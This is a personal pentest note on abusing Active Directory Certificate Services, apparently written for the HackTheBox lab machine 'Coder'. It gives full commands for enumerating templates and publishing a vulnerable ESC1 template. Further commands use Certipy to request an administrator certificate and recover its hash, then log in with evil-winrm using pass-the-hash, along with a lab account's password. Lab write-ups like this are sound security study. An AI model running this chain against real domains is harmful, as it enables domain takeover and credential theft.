---
creation date: April 7th 2023
last modified date: April 7th 2023
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Active Directory Certificate Services (AD CS)]]  
___

## Description:  

**enumerate on the machine with [ADCSTemplate](https://github.com/GoateePFE/ADCSTemplate)**

```
import-module "C:/Users/e.black/Documents/ADCSTemplate.psm1"
Get-ADCSTemplate

# clean output
Get-ADCSTemplate | Sort-Object Name | ft Name, Created, Modified
```


Use [[Certify]] on the machine and [[Certipy]] for remote


### Enumerate access control information for PKI objects
[[Certify]]
`Certify.exe pkiobjects [/domain:domain.local] [/showAdmins] [/quiet]`

You can then create a vulnerable template:

use [ADCSTemplate](https://github.com/GoateePFE/ADCSTemplate) to set requirements for EC1

```
Import-Module C:\Users\e.black\Documents\ADCSTemplate

Export-ADCSTemplate -DisplayName Administrator > .\Administrator.json
```

Make changes to the json, you can get a vuln template from here: https://github.com/Orange-Cyberdefense/GOAD/blob/main/ansible/roles/adcs_templates/files/ESC1.json
```
New-ADCSTemplate -DisplayName ESC1 -JSON (Get-Content .\tmp.json -Raw) -Publish -Identity "CODER\PKI Admins"
```
Then exploit it:
```
/home/kali/.local/bin/certipy find -u e.black@coder.htb -p ypOSJXPqlDOxxbQSfEERy300 -dc-ip 10.10.11.207 -stdout -vulnerable

/home/kali/.local/bin/certipy req -u e.black@coder.htb -p ypOSJXPqlDOxxbQSfEERy300 -dc-ip 10.10.11.207 -template ESC1 -ca coder-DC01-CA -upn administrator@coder.htb

sudo ntpdate -u 10.10.11.207

/home/kali/.local/bin/certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'coder.htb' -dc-ip 10.10.11.207

evil-winrm -i coder.htb -u Administrator -H 'inputhashhere'

```
___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: April 7th 2023 (02:45 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
